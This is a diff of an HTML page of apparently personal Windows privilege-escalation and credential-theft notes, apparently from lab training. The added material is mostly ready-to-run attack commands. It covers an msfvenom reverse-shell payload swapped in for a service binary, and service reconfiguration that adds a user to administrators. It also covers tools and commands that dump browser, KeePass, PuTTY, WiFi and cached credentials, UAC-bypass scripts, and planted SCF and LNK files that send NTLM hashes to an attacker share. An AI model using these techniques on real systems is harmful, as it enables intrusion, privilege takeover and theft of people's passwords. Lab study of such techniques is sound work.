@@ -32,8 +32,12 @@
                 <div class="notion-body">
                     <h2 id="Automation">Automation</h2>
                     <ul>
-                        <h3> Winpeas.exe </h3>
+                        <h3> Winpeas.exe</h3>
                         <pre><code class="language-powershell">wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/winPEASx64.exe -outfile wpeas.exe</code></pre>
+                        <h3>PowerUp</h3>
+                        <pre><code class="language-powershell">Import-Module .\powerup.ps1
+Invoke-AllChecks</code></pre>
+                        <p>In case it finds something it will tell you exactlly the command to abuse the flaw (AbuseFunction)</p>    
                     </ul> 
 
                     <h2 id="Enumeration">Enumeration</h2>
@@ -387,7 +391,6 @@ sc start dns</code></pre>
                     <h3>Print Operators</h3>
                     <ul>
                         <p>Print Operators is another highly privileged group, which grants its members the <b>SeLoadDriverPrivilege</b> If we perform the <b>whoami /priv</b> and don't see <b>SeLoadDriverPrivilege</b> privilge enabled will have bypass the UAC</p>
-                        #Finish the process of bypassing the UAC
                         <p>Once we see the privilege we will upload the driver the driver Capcom.sys which contains a functionallity to allow any user to execute shellcode with SYSTEM privielges. Here are the steps</p>
                         <p>We will use the tool <a class="notion-link" href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp">EnableSeLoadDriverPrivilege.cpp</a> download the file, open it with Visual Studio and add the following libraries</p>
                         <pre><code class="language-powershell">#include &lt;windows.h&gt;
@@ -456,6 +459,74 @@ sc config AppReadiness binPath= "cmd.exe /c powershell.exe -ExecutionPolicy Bypa
                     </ul>
                 </ul>   
                 
+                <h2 id="Weak permissions">Weak permissions</h2>
+                <ul>
+                    <h3>Permissive File System ACLs</h3>
+                    <ul>
+                        <p>Using <b>SharpUp</b> we can check for service binaries suffering from weak ACL's. Have in mind that SharpUp is been builded in .NET 3.5 so when compiling it with Visual studio we will need to go to properties of the main file and change the .NET framework according to what machine are targeting. We can also check the .NET versions present on the host by doing</p>
+                        <pre><code class="language-powershell">reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"</code></pre>
+                        <p>Once we have a working .exe use the following command in order to find binaries with weak ACLs</p>
+                        <pre><code class="language-powershell">.\SharpUp_4_7_2.exe audit</code></pre>
+                        <p>The important sections are <b>=== Modifiable Service Binaries ===</b> and <b>=== Modifiable Services ===</b></p>
+                        <h4>=== Modifiable Service Binaries ===</h4>
+                        <ul>
+                            <p>In case we found one we must check the iacls (permissions) over the .exe file of the service. Here goes an example</p>
+                            <pre><code class="language-powershell">icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
+                            <p>In case Everyone:(I)(F) or other full control in a group we are present we found a security threat</p>
+                            <p>We could now replace the binary of the service which we have control for a malicious .exe file. Here are some steps</p>
+                            <pre><code class="language-powershell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.9 LPORT=9999 -f exe -o shell.exe #Generate the payload in your attacker machine and transfer it to the victim
+sc qc SecurityService #Check who runs this service take special attention to  SERVICE_START_NAME : LocalSystem
+#Change the name of the malicious .exe file to match the service binary affected
+cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"  #Copy your malicious .exe file to the path of the service binary (Can be found in SharpUp output)
+sc start SecurityService #Start the service. Now you have a s
+</code></pre>
+
+                        </ul>
+
+                        <h4>=== Modifiable Services ===</h4>
+                        <ul>
+                            <p>In case we see a any binary inside this section we could be able to modify it's binary path. But first we could use <b>AccessChk</b> from sysinternals to enumerate permissions on the service</p> 
+                            <pre><code class="language-powershell">accesschk.exe /accepteula -quvcw WindscribeService #-q (omit banner), -u (suppress errors), -v (verbose), -c (specify name of a Windows service), and -w (show only objects that have write access)</code></pre>
+                            <p>In case we see that we are in any of the groups listed, included the Authenticated Users we are able to execute the change</p>
+                            <pre><code class="language-powershell">sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add" #Try them on CMD
+sc config WindscribeService binpath="cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\Users\server_adm\Desktop\shell.ps1"</code></pre>
+                        </ul>
+                        
+
+                         Service 'SecurityService' (State: Stopped, StartMode: Auto) : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+                    </ul>
+
+                    <h3>Unquoted Service path</h3>
+                    <ul>
+                        <p>When ever a windows service installs it saves the path in the Windows register. The problem appears when this path is saves without quotes</p>
+                        <pre><code class="language-cmd">"C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe"  ✅ (Right)
+ C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe    ⚠️ (vulnerable)</code></pre>
+                        <p>In those cases where quotes are not implace windows interprets paths in a strange way. It attempts to execute the binary trying the differents paths provided. Here is an example have as a base the previous unquoted path</p>
+                        <pre><code class="language-cmd">C:\Program.exe
+C:\Program Files.exe
+C:\Program Files (x86)\System.exe
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code></pre>
+                        <p>In case we would be able to write a file in any of this rotes with the specified name we could be able to perform a hijack</p>
+                        <p>Now let's search for those services with unquoted path. Use the following query</p>
+                        <pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>    
+                        <p>Once we identifyed the path we can use the following field to identify which could be the possible file locations to place our malicious .exe</p>
+                        <div class="path-analyzer">
+                            <input type="text" id="pathInput" placeholder="Ej: C:\Program Files\GVFS\GVFS.Service.exe" style="width:400px;">
+                            <button onclick="analyzePath()">Analyze</button>
+                            <div class="path-analyzer-results">
+                                <textarea id="output" rows="10" cols="60" readonly></textarea>
+                            </div>
+                        </div>
+                    </ul>
+                    
+                    <h3>Modifiable Registry Autorun Binary</h3>
+                    <ul>
+                        <p>There are certain binaries which start when the OS starts we can check. We can check which are those binaries using the following command</p>
+                        <pre><code class="language-cmd">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl</code></pre>    
+                        <p>Now we can check it's permissions and in case we have full control we can replace the binary with a malicious file. That way when an admin or other users login that binary will be executed</p> 
+                        <pre><code class="language-cmd">icacls C:\Users\htb-student\AppData\Local\Microsoft\OneDrive\OneDrive.exe</code></pre>
+                    </ul>
+                </ul>
 
                     <h2 id="BloodyAD">BloodyAD</h2>
                     <ul>
@@ -541,8 +612,141 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
                     <ul>    
                         <p>Once we gained access to a computer/domain we can perform credential huntgin by using <b>LaZagne</b></p>
                         <pre><code class="language-powershell">.\LaZagne.exe all</code></pre>
+                        <p>Other similar software <a class="notion-link" href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></p>
+                        <pre><code class="language-powershell">Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Target WINLPE-SRV01</code></pre>
                         <p>Also we can use findstr to discover some filetypes</p>
-                        <pre><code class="language-powershell">findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></pre>
+                        <pre><code class="language-powershell">findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+findstr /SIM /C:"password" C:\Users\ *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml #In case you would like to start from specific directory</code></pre>
+                        <p>Other methods can be found in the following section</p>
+                        <div class="button" onclick="toggleDiv()">Show content</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>Search file contents cmd methods</p>
+                                    <pre><code class="language-cmd">cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt 
+findstr /si password *.xml *.ini *.txt *.config
+findstr /spin "password" *.*</code></pre> 
+                                    <p>Search file conents powershell methods</p>
+                                    <pre><code class="language-powershell">select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+where /R C:\ *.config
+Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></pre>      
+                        </div>
+                        
+                        <h3>Autologon</h3>
+                        <ul>
+                            <p>Feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password. The values can be found in</p>
+                            <pre><code class="language-cmd">reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</code></pre>
+                        </ul>
+
+                        <h3>Sticky notes</h3>
+                        <ul>
+                            <p>Sometimes we can find sticky notes. The information of that notes is saves in</p>
+                            <pre><code class="language-cmd">C:\Users\$USER\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\</code></pre>
+                            <p>Inside we can find the <b>plum.sqlite</b> and <b>plum.sqlite-shm</b> and <b>plum.sqlite-wal</b> then transfer it to our machine and open it with a DB Browser for SQLite and select the table called <b>DB Browser for SQLite</b></p>
+                            <p>Other methods can be used to extract the content</p>
+                            <p>Use strings over the files</p>
+                            <pre><code class="language-cmd">strings plum.sqlite</code></pre>
+                            <p>Use the PSSQLite module from powershell</p>
+                            <pre><code class="language-cmd">PS C:\htb> cd .\PSSQLite\
+PS C:\htb> Import-Module .\PSSQLite.psd1
+PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap</code></pre>
+                        </ul>
+
+                        <h3>Google Chrome credentials</h3>
+                        <ul>
+                            <p>We can use <a class="notion-link" href="https://github.com/GhostPack/SharpDPAPI">SharpChrome</a>to extract saved credentials in chrome</p>
+                            <p>Once compiled use the following command to extract credentials for our current user. Remember DPAPI is present and can only be done from the same computer and using the same user who saved that password</p>
+                            <pre><code class="language-cmd">.\SharpChrome.exe logins /unprotect</code></pre>
+                        </ul>
+
+                        <h3>Mozilla Firefox credentials</h3>
+                        <ul>
+                            <p>Mozilla firefox stores credentials in a sqlite database we can copy the database in our current directory by using the following command</p>
+                            <pre><code class="language-cmd">copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .</code></pre>
+                            <p>Now we can extract it's content by using cookieextractor.py</p>
+                            <pre><code class="language-bash">python3 cookieextractor.py --dbpath "/mnt/hgfs/vmwareshared/cookies.sqlite"
+#output
+(10, '', 'd', '$COOKIEEEEE', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)</code></pre>
+                            <p>Here you can see also the web where the cookie comes from. We can visit that website (can only be locally in the target machine) and edit the cookie using any extension</p>
+                            
+                            <p>We can also use <a class="notion-link" href="https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47">SharpChromium</a></p>
+                            <pre><code class="language-cmd">copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"  #Copy the path to make Sharpchromium work
+                            Import-Module .\SharpChromium
+                            Invoke-SharpChromium -Command "cookies slack.com"    </code></pre>    
+                        </ul>
+
+                        <h3>Keypass database</h3>
+                        <ul>
+                            <p>In some times you'll find files like <b>.kdbx</b> which consists in KeePass databases which contains all passwords. Theese files are protected by a master password that we could be able to crack</p>
+                            <p>First transfer that file to your machine and get the hash using <b>keepass2john</b></p>
+                            <pre><code class="language-bash">keepass2john.py ILFREIGHT_Help_Desk.kdbx</code></pre>
+                            <p>save the whole hash into a file and passit to hashcat</p>
+                            <pre><code class="language-bash">hashcat -m 13400 keepass_hash </code></pre>
+                        </ul>
+
+                        <h3>Putty</h3>
+                        <ul>
+                            <p>When you establish a session with putty all credentials are saved in the registry. The sessions are saved per user so first we need to list the users </p>
+                            <pre><code class="language-bash">reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions</code></pre>
+                            <p>This will list users and now we can query specific user</p>
+                            <pre><code class="language-bash">reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh</code></pre>
+                        </ul>
+
+                        <h3>Mail searching</h3>
+                        <ul>
+                            <p>We can use <a class="notion-link" href="https://github.com/dafthack/MailSniper">MailSniper</a> in order to connect to an exchange server an extract emails containing some passwords</p>
+                            <pre><code class="language-bash">Import-Module .\MailSniper.ps1
+Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -OutputCsv global-email-search.csv</code></pre>
+                        </ul>
+
+                        <h3>Wifi passwords</h3>
+                        <ul>
+                            <p>In case we have local admin in a computer where it has a wireless card we can list the wireless networks that have recently connected</p>
+                            <pre><code class="language-bash">netsh wlan show profile</code></pre>
+                            <p>Depending on the network configuration we can retrieve the <b>Pre-shared</b> key (Key Content) and potentially access the target network</p>
+                            <pre><code class="language-bash">netsh wlan show profile ilfreight_corp key=clear
+Security settings
+-----------------
+    Authentication         : WPA2-Personal
+    Cipher                 : CCMP
+    Authentication         : WPA2-Personal
+    Cipher                 : GCMP
+    Security key           : Present
+    Key Content            : ILFREIGHTWIFI-CORP123908!</code></pre>
+                            
+                        </ul>
+                        
+                    </ul>
+
+                    <h2 id="Enumerating with cmdkey (Stored credentials)">Enumerating with cmdkey (Stored credentials)</h2>
+                    <ul>
+                        <p>We can use cmdkey to enumerate the credentials stored in the current user's profile. In case we see another use we could try to login resuing credentials without issuing any cred</p>
+                        <p>List credentials by using</p>
+                        <pre><code class="language-powershell">cmdkey /list</code></pre>
+                        
+                        <p>An example of credentials from another used found</p>
+                         <pre><code class="language-powershell">Target: Domain:interactive=SRV01\mcharles
+Type: Domain Password
+User: SRV01\mcharles</code></pre>
+                        <p>We can reuse the credentials by doing</p>
+                        <pre><code class="language-powershell">/savecred /user:SRV01\mcharles cmd </code></pre>
+                        <p>Now we can use mimikatz to crack stored passwords from user mcharles</p>
+                        <pre><code class="language-powershell">mimikatz # privilege::debug    
+mimikatz # sekurlsa::credman  </code></pre>
+                        <p><b>It is posible that you requiere to perform a relogin from the victim side</b></p>
+                        
+                        <h3>Pivoting with saved credentials</h3>
+                        <ul>
+                            <p>With those saved credentials we could perform a RDP connection to the computer it is pointing without needing to introduce any creds</p>
+                        </ul>
+
+                        <h3>Command execution</h3>
+                        <ul>
+                            <p>We could even execute commands as another user</p>
+                            <pre><code class="language-powershell">runas /savecred /user:inlanefreight\bob "COMMAND HERE"</code></pre>
+                            
+                        </ul>
                     </ul>
 
                     <h2 id="Extracting SAM">Extracting SAM</h2>
@@ -614,20 +818,7 @@ sekurlsa::logonpasswords</code></pre>
                         </ul>    
                     </ul>
 
-                    <h2 id="Enumerating with cmdkey (Stored credentials)">Enumerating with cmdkey (Stored credentials)</h2>
-                    <ul>
-                        <p>We can use cmdkey to enumerate the credentials stored in the current user's profile. In case we see another use we could try to login resuing credentials without issuing any cred</p>
-                        <p>An example of credentials from another used found</p>
-                         <pre><code class="language-powershell">Target: Domain:interactive=SRV01\mcharles
-Type: Domain Password
-User: SRV01\mcharles</code></pre>
-                        <p>We can reuse the credentials by doing</p>
-                        <pre><code class="language-powershell">/savecred /user:SRV01\mcharles cmd </code></pre>
-                        <p>Now we can use mimikatz to crack stored passwords from user mcharles</p>
-                        <pre><code class="language-powershell">mimikatz # privilege::debug    
-mimikatz # sekurlsa::credman  </code></pre>
-                        <p><b>It is posible that you requiere to perform a relogin from the victim side</b></p>    
-                    </ul>
+                    
 
                     <h2 id="Exporting NTDS.dit">Exporting NTDS.dit</h2>
                     <ul>
@@ -704,6 +895,15 @@ secrets64.bin</code></pre>
                                 <pre><code class="language-powershell">akagi32.exe 23 #By itself it opens a shell with same user but with full privileges you can the user impersonate
 akagi32.exe 23 C:\Users\sarah\Desktop\shell.exe #You can also use it to execute files as admin in that case it is recommended to generate a msfvenom payload and get a meterpreter shell </code></pre>    
                                 </ul>
+
+                                <h3>Bypass-UAC powershell</h3>
+                                <ul>
+                                    <p>Here you can find severall methods to bypass UAC all in one powershell script <a class="notion-link" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC.ps1</a></p>
+                                    <p>There are 5 methods to try, look at the github page and choose method based on the operating system</p>
+                                    <p>Just download and import it</p>
+                                    <pre><code class="language-powershell">Import-Module .\Bypass-UAC.ps1
+Bypass-UAC -Method UacMethodSysprep</code></pre>    
+                                </ul>
                     </ul>
 
                     <h2 id="Pass the ticket">Pass the ticket</h2>
@@ -774,15 +974,138 @@ Enter-PSSession -ComputerName DC01</code></pre>
         FILE_ALL_ACCESS
                         </code></pre>
                     </ul>
+
+                    <h2 id="Installed software">Installed software</h2>
+                    <ul>    
+                        <p>It is always a useful to look for software which is not default in windows installation. This way you could be able find exploits to leverage your privileges. You can check which software is installed using</p>
+                        <pre><code class="language-cmd">wmic product get name</code></pre>
+                    </ul>
                 
-                    
-                    
+                    <h2 id="Escaping restricted environments">Escaping restricted environments</h2>
+                    <ul>    
+                        <p>In some ocasions you'll land on a computer which have restrictions over the functions it can do. For example you would not be able to navigate for all the folders of the C:\ Drive. In that case there are some methods to bypass this</p>
+
+                        <h3>Opening CMD</h3>
+                        <ul>
+                            <h4>Through browsers</h4>
+                            <p>Open a browser and from the search bar attempt to include local files such as <b>C:\Windows\System32\cmd.exe</b> this will download the .exe file which then can be executed you can also try with <b>\\127.0.0.1\c$\windows\system32\cmd.exe</b></p>
+                            
+                            <h4>Change shortcut</h4>
+                            <p>We can create a shortcut of a folder and then modify the <b>target</b> parameter in the properties to make it point to C:\Windows\system32\cmd.exe</p>
+
+                            <h4>Transfering cmd.exe</h4>
+                            <p>We can also compile a c file which will open the C:\Windows\System32\cmd.exe file and open a smb server in our attacking machine to then perform query from the target machine using \\10.10.15.10\share\cmd.exe to download the file</p>
+                            <pre><code class="language-c">#include &lt;stdlib.h&gt;
+int main() {
+  system("C:\\Windows\\System32\\cmd.exe");
+}</code></pre>
+
+                        </ul>
+                    </ul>
+
+                    <h2 id="Interacting with users">Interacting with users</h2>
+                    <ul>    
+                        <p>If any of the previous things haven't work it's time to test users.</p>
+                        <h3>Running Monitoring script</h3>
+                        <ul>
+                        <p>Since it can be that some scheduled task or other processes are being executed passing credentials in the command line we can use the following script in order to dectect them</p>
+                        <pre><code class="language-powerhshell">while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}</code></pre>
+                        </ul>
+
+                        <h3>Malicious SCF files</h3>
+                        <ul>
+                            <b>This only works for WS 2016</b>
+                            <p>SFC which means shell command file is used by windows explorar to move up and down directories. Since that we can use it to trigger a connection into our malicious share and capture NTLMv2 hashes</p>
+                            <p>First find a folder when you can write files. We can use the following script in powershell</p>
+                            <pre><code class="language-powershell">Get-ChildItem C:\ -Recurse -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    $path = $_.FullName
+    try {
+        $test = [System.IO.Directory]::CreateDirectory("$path\test_perm_check")
+        Remove-Item "$path\test_perm_check" -Force
+        Write-Output $path
+    } catch {}
+}</code></pre>
+                            <p>Open a smb share and responder in your attacker machine</p>
+                            <pre><code class="language-bash">impacket-smbserver share . -smb2support
+sudo responder  -I tun0 </code></pre>
+                            <p>Now Prepare the following .sfc file, remember to place it in a place where someone would click. Put the following content: As we can see we are performing a connection to our attacker machine</p>
+                            <pre><code class="language-powershell">[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop</code></pre>
+                                
+                            <p>Wait for someone to open that file and capture the hash in your attacker machine. Once you have it crack it using hashcat code 5600</p>    
+                        </ul>
+
+                        <h3>Malicious ink files</h3>
+                        <ul>
+                            <b>Similar process can be performed in WS 2019 using .ink files</b>
+                            <p>We can use several tools to generate the payload of .ink file. One of them is <a class="notion-link" href="https://github.com/dievus/lnkbomb">Lnkbomb</a></p>
+                            <p>Rest of the process ramiains the same. Here is a payload attempting to access a smb share</p>
+                            <pre><code class="language-powershell">$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\ATTACKER_IP\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()</code></pre>
+                        </ul>
+                    </ul>
+                </ul>    
                 </div>
           </div>
     </div>
 </body>
 
 <script>
+
+    function getUnquotedExecutables(path) {
+    path = path.replace(/^"|"$/g, "");
+
+    const parts = path.split(" ");
+    const results = [];
+
+    let current = parts[0];
+
+    for (let i = 1; i < parts.length; i++) {
+        results.push(current + ".exe");
+        current += " " + parts[i];
+    }
+
+    results.push(current);
+
+    return results;
+}
+
+function analyzePath() {
+    const input = document.getElementById("pathInput").value;
+
+    if (!input) {
+        alert("Introduce a path :)");
+        return;
+    }
+
+    const executables = getUnquotedExecutables(input);
+
+    const output = document.getElementById("output");
+    output.value = "Possible executables:\n\n";
+
+    executables.forEach(e => {
+        output.value += e + "\n";
+    });
+}
+
+
         
     function generateMenu(){
         const headers = document.querySelectorAll('.notion-container h2');
@@ -792,7 +1115,7 @@ Enter-PSSession -ComputerName DC01</code></pre>
             const listItem = document.createElement('li');
             const link = document.createElement('a');
             link.textContent = header.textContent;
-            console.log(header.textContent);
+            //console.log(header.textContent);
             link.setAttribute('href', `#${header.textContent}`);
             listItem.appendChild(link);
             sidebarList.appendChild(listItem);
